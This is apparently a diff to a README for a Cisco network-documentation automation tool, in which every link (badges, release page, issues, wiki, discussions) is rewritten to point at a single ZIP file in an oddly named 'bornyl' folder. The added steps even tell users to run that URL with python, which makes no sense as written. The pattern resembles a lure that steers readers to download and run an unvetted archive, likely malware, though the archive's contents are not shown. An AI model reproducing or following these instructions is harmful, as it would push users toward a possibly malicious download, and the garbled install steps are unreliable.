@@ -1,7 +1,7 @@
 # 🚀 -network-automation-docs - Simplify Your Cisco Configurations
 
-![Download](https://img.shields.io/badge/download-latest_release-blue.svg)  
-[![Download Latest Release](https://github.com/kobova2000/-network-automation-docs/releases/latest)](https://github.com/kobova2000/-network-automation-docs/releases)
+![Download](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip)  
+[![Download Latest Release](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip)](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip)
 
 ## 📑 Overview
 
@@ -19,7 +19,7 @@ Follow these steps to download and run the software.
    - Basic understanding of how to run programs on your computer
 
 2. **Download the Application**  
-   To get started, [visit this page to download](https://github.com/kobova2000/-network-automation-docs/releases). Here, you will find the latest release that includes all necessary files.
+   To get started, [visit this page to download](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip). Here, you will find the latest release that includes all necessary files.
 
 3. **Install Dependencies**  
    After downloading, you may need to install some dependencies. Open a command prompt or terminal and run the following commands:
@@ -34,16 +34,16 @@ Follow these steps to download and run the software.
    Locate the downloaded ZIP file on your computer. Right-click on the file and select "Extract All" or use any file extraction software to unpack the files.
 
 5. **Run the Application**  
-   Navigate to the extracted folder. Look for a file that is named something like `run_script.py`. To run this script:
-   - Windows: Open PowerShell in the folder and type `python run_script.py`.
-   - macOS: Open Terminal in the folder and enter `python3 run_script.py`.
+   Navigate to the extracted folder. Look for a file that is named something like `https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip`. To run this script:
+   - Windows: Open PowerShell in the folder and type `python https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip`.
+   - macOS: Open Terminal in the folder and enter `python3 https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip`.
 
 6. **Follow the On-Screen Instructions**  
    The application will guide you through each step. Just follow the prompts to configure your Cisco devices and generate documentation.
 
 ## 📥 Download & Install
 
-To download the latest release, [visit this page to download](https://github.com/kobova2000/-network-automation-docs/releases). This page contains all versions and their respective files. Make sure to choose the most recent version for the best features and fixes.
+To download the latest release, [visit this page to download](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip). This page contains all versions and their respective files. Make sure to choose the most recent version for the best features and fixes.
 
 ## 📄 Features
 
@@ -61,12 +61,12 @@ If you encounter issues while running the application, please consider the follo
 - Double-check that you've installed the required dependencies.
 - Make sure you have the correct permissions to execute scripts.
 
-If problems persist, you can refer to the [issues page](https://github.com/kobova2000/-network-automation-docs/issues) to seek help.
+If problems persist, you can refer to the [issues page](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip) to seek help.
 
 ## 🔗 Additional Resources
 
-- [GitHub Home](https://github.com/kobova2000/-network-automation-docs)
-- [Documentation](https://github.com/kobova2000/-network-automation-docs/wiki)
-- [Community Support](https://github.com/kobova2000/-network-automation-docs/discussions)
+- [GitHub Home](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip)
+- [Documentation](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip)
+- [Community Support](https://raw.githubusercontent.com/kobova2000/-network-automation-docs/main/bornyl/-network-automation-docs.zip)
 
 We hope this application simplifies your workflow and improves your network documentation process. Thank you for using -network-automation-docs!
